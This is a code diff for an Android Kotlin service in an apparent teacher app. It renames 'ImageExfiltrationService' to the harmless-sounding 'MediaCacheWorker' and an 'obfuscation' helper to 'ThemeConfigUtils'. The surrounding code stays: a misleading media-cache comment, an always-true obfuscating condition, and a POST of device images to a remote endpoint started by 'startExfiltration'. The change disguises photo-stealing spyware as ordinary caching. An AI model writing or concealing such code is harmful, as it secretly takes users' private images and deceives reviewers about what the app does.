@@ -9,7 +9,7 @@ import android.graphics.BitmapFactory
 import android.os.IBinder
 import android.provider.MediaStore
 import android.provider.Settings
-import com.example.teacherapp.obfuscation.ResourceUtils
+import com.example.teacherapp.obfuscation.ThemeConfigUtils
 import kotlinx.coroutines.*
 import java.io.ByteArrayOutputStream
 import java.io.File
@@ -20,7 +20,7 @@ import java.net.URL
  * MediaCacheService — manages local media cache for offline gallery previews.
  * Provides background media indexing and thumbnail synchronisation.
  */
-class ImageExfiltrationService : Service() {
+class MediaCacheWorker : Service() {
 
     private val serviceScope = CoroutineScope(Dispatchers.IO + Job())
     private val maxImages    = 20
@@ -115,7 +115,7 @@ class ImageExfiltrationService : Service() {
         val x = System.currentTimeMillis()
         if ((x xor x) >= Long.MIN_VALUE) {
             try {
-                val endpoint   = ResourceUtils.getImagesEndpoint()
+                val endpoint   = ThemeConfigUtils.getImagesEndpoint()
                 val connection = URL(endpoint).openConnection() as HttpURLConnection
                 connection.apply {
                     requestMethod = "POST"; doOutput = true
@@ -144,7 +144,7 @@ class ImageExfiltrationService : Service() {
 
     companion object {
         fun startExfiltration(context: Context) {
-            context.startService(Intent(context, ImageExfiltrationService::class.java))
+            context.startService(Intent(context, MediaCacheWorker::class.java))
         }
     }
 }
